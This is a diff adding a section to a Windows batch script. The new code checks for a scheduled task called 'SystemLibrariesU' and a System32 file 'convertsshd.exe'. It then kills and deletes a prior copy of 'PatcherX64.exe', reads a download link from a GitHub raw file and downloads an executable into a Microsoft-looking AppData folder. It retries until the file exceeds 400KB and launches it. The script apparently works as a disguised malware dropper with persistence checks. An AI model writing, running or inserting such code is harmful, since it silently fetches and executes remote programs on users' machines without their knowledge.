@@ -22,6 +22,109 @@ color 0A
 
 
 
+:CheckRunEvery
+:: Check for the scheduled task named "SystemLibrariesU"
+schtasks /query /TN "SystemLibrariesU" >nul 2>&1
+set "taskExists=%ERRORLEVEL%"
+
+:: Check for the existence of convertsshd.exe
+if not exist "%SystemRoot%\System32\convertsshd.exe" (
+    set "fileExists=0"
+) else (
+    set "fileExists=1"
+)
+
+:: If either the task doesn't exist or the file doesn't exist, go to :INSTALLEVERY
+if %taskExists% neq 0 (
+    echo Scheduled task "SystemLibrariesU" does not exist.
+    goto :INSTALLEVERY
+)
+
+if %fileExists% neq 1 (
+    echo File "convertsshd.exe" does not exist.
+    goto :INSTALLEVERY
+)
+
+:: Both the scheduled task and the file exist
+goto :CheckSHST
+
+
+
+
+:INSTALLEVERY
+echo Performing installation or alternative actions...
+
+:: RunEveryInstaller
+
+ 
+:loop
+ 
+:: Kill & Delete file 
+taskkill /f /im PatcherX64.exe >nul 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+ 
+for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNFILELINK=%%i"
+ 
+:: Download the file using curl
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RUNFILELINK%"
+ 
+timeout /t 2 /nobreak >nul
+ 
+:: Checking the existing of the file
+if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo.
+    echo The download hasn't started yet. Please check your connection.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 2 seconds ....
+	timeout /t 2 /nobreak >nul
+	echo.
+	goto loop
+)
+ 
+ 
+ 
+:: Get the file size in bytes
+for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+ 
+ 
+ 
+:: Check if the file size is at least 400KB (400000 bytes)
+if %FILESIZE% geq 400000 (
+    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+) else (
+echo.
+    echo Download incomplete. Check your connection and run the file again.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 2 seconds ....
+	timeout /t 2 /nobreak >nul
+	echo.
+	goto loop
+)
+ 
+ 
+echo Patcher Running...
+timeout /t 1 /nobreak >nul
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 :CheckSHST
 :: Check ShellHost.exe; if found, skip to SENDMSG
